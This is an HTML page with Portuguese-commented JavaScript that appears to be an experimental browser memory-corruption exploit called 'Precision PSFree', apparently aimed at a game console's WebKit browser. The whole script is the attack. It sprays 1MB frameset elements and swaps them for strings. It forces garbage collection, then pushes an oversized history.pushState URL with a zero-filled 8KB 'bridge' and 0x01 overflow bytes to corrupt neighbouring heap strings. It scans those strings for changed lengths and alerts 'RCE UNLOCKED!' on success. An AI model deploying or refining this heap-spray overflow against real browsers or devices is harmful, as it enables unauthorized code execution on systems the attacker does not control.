<!DOCTYPE html>
<html>
<head>
    <title>Precision PSFree: 1MB + 8KB Gap</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
    </style>
</head>
<body>

    <h1>Precision PSFree</h1>
    <p>Vítimas de 1MB (Large Heap) + Ponte de 8KB (Sua Descoberta).</p>

    <button onclick="startPrecisionAttack()">INICIAR ATAQUE CIRÚRGICO</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520; 
        
        // A SUA DESCOBERTA: O vizinho começa após 8KB
        const BRIDGE_SIZE = 8192; 
        
        const OVERFLOW_AMT = 1024 * 4; // Ataque pequeno e focado após a ponte

        // CONFIGURAÇÃO DA VÍTIMA (1MB para alinhar com Large Heap)
        const TARGET_SIZE = 1024 * 1024; 
        
        // Cálculo do Frameset (PSFree Logic)
        // 8 bytes por elemento
        const FS_ELEMENTS = (TARGET_SIZE / 8) - 2;
        const FS_ROWS = ",".repeat(FS_ELEMENTS);

        var victims_fs = [];
        var victims_str = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startPrecisionAttack() {
            log(`[Config] Base: ${BASE_OFFSET} | Ponte: ${BRIDGE_SIZE} | Vítima: 1MB`);
            log("1. Alocando Framesets de 1MB...");
            
            // FASE 1: SPRAY FRAMESET
            // Usamos frameset porque ele é mais "limpo" no fastMalloc/Large
            victims_fs = [];
            const SPRAY_COUNT = 60;

            try {
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let fset = document.createElement('frameset');
                    fset.rows = FS_ROWS;
                    victims_fs.push(fset);
                }
            } catch(e) {
                log("Erro Spray: " + e.message);
                return;
            }

            // FASE 2: SWAP PARA STRINGS (Técnica PSFree)
            log("2. Trocando Framesets por Strings (Swap)...");
            
            // Prepara string 8-bit de 1MB
            let rawBuffer = new Uint8Array(TARGET_SIZE - 24);
            rawBuffer.fill(0x42); 
            let decoder = new TextDecoder("utf-8");
            let baseString = decoder.decode(rawBuffer);

            victims_str = [];
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims_fs[i].rows = ""; 
                victims_fs[i] = null;
                
                // Tenta ocupar o buraco
                let s = i + "_" + baseString.substring((i+"_").length);
                victims_str.push(s);
            }

            await forceGC();

            // FASE 3: EXPLOIT COM PONTE
            log("3. Disparando com Ponte de 8KB...");

            setTimeout(() => {
                try {
                    // CONSTRUÇÃO DO PAYLOAD
                    // 1. Enche o buffer legítimo
                    let buffer = "A".repeat(BASE_OFFSET);
                    
                    // 2. A PONTE (Cruza o espaço vazio de 8KB que você achou)
                    // Usamos Zeros para não quebrar nada no caminho
                    buffer += "\u0000".repeat(BRIDGE_SIZE);
                    
                    // 3. O ATAQUE (0x01)
                    // Agora sim, estamos na porta do vizinho.
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "precision_pwn", "/" + buffer);

                    log("4. Verificando...");
                    checkCorruption(TARGET_SIZE - 24);

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        function checkCorruption(expectedLen) {
            let success = false;
            for(let i=0; i<victims_str.length; i++) {
                let s = victims_str[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // CHECAGEM DE LENGTH
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! String ${i} Length: ${msg.length}`, 'win');
                        alert("RCE UNLOCKED!");
                        success = true;
                        break;
                    }
                    
                    // CHECAGEM DE DADOS
                    if (msg.charCodeAt(0) !== 66) { // 'B'
                         log(`[SINAL] Dados atingidos após a ponte de 8KB!`, 'win');
                         success = true;
                         break;
                    }

                } catch(e) {}
            }
            if(!success) log("Nada atingido. O alinhamento ainda resiste.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
